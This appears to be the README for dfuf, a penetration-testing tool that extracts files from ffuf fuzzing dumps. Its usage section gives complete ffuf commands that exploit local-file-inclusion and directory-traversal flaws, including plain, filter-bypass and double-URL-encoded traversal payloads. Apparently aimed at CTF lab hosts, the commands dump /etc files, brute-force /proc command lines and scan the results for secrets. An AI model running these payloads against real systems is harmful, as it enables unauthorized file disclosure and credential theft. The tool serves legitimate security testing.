# dfuf - Dump Faster U Fool

## About

> The name of **dfuf** was inspired by **ffuf** (Fuzz Faster U Fool)

### Why dfuf?

**ffuf** can save request & response dump to a directory (`-od` option)

This simple script can extract files from the request & response dump saved by **ffuf**.

**ffuf** should be faster than any LFI dumpers available on the public. So, why not use **ffuf** to dump files?

### Example Use Cases

- When one was stuck at initial foothold, he/she might need to dump files via LFI / Directory Traversal vulnerability for further enumeration.

- When getting shell is impossible, one may perform data exfiltration by dumping files via LFI / Directory Traversal vulnerability.

## Demo

- Brute force cmdline in `/proc`

[![asciicast](https://asciinema.org/a/627480.svg)](https://asciinema.org/a/627480)

- Dump common files under `/etc` and harvest secrets

[![asciicast](https://asciinema.org/a/627891.svg)](https://asciinema.org/a/627891)

- Dump files in webroot with url double encode

[![asciicast](https://asciinema.org/a/627946.svg)](https://asciinema.org/a/627946)


## Installation

Make sure [pipx](https://github.com/pypa/pipx?tab=readme-ov-file#install-pipx) is installed.

```bash
pipx install git+https://github.com/opabravo/dfuf
```

## Usage

```bash
usage: dfuf [-h] -o FFUF_JSON_OUTPUT -od FFUF_OUTPUT_DIR dir_to_save_extracted_files

A tool to extract files from ffuf output

https://github.com/opabravo/dfuf

positional arguments:
  dir_to_save_extracted_files
                        Output directory where extracted files will be saved

options:
  -h, --help            show this help message and exit
  -o FFUF_JSON_OUTPUT, --ffuf-json-output FFUF_JSON_OUTPUT
                        Json output file from ffuf
  -od FFUF_OUTPUT_DIR, --ffuf-output-dir FFUF_OUTPUT_DIR
                        Output directory from ffuf

Usage:
    1. Dump files with ffuf
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 -od ffuf -o ffuf.json

    2. Extract files from ffuf output
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

Examples:
    1. Common linux files (880 lines) (~8 sec)
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

    2. Common files under `/etc` (8314 lines) (~1 min)
        $ ffuf -c -u 'http://snoopy.htb/download?file=....//....//....//..../FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump
        $ tartufo scan-folder ffuf_dump/

    3. Brute force cmdline in `/proc` (~1 min)
        $ ffuf -c -u 'http://megahosting.htb/news.php?file=../../../../../../FUZZ' -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -fs 0 -od ffuf -o ffuf.json
        $ dfuf -o ffuf.json -od ffuf ffuf_dump

        View the result in a pretty format :
        $ find ffuf_dump/proc -type f -exec bash -c 'pid=$(echo $0 | cut -d '/' -f3); echo -en "\n$pid | "; cat $0 | tr "\0" " "' {} \; | sort -s -n -k 1,1

    4. Files in web root with url double encode
        $ feroxbuster -t 150 -o ferox_443.txt -k -u https://broscience.htb/
        $ ffuf -c -u 'https://broscience.htb/includes/img.php?path=..%252fFUZZ' -w <(cat ferox_443.txt | awk '{print $6}' | unfurl -u paths | grep '.php$') -enc 'FUZZ:urlencode' -o ffuf.json -od ffuf
        $ dfuf -o ffuf.json -od ffuf ffuf_dump
```

## License

[MIT](LICENSE)


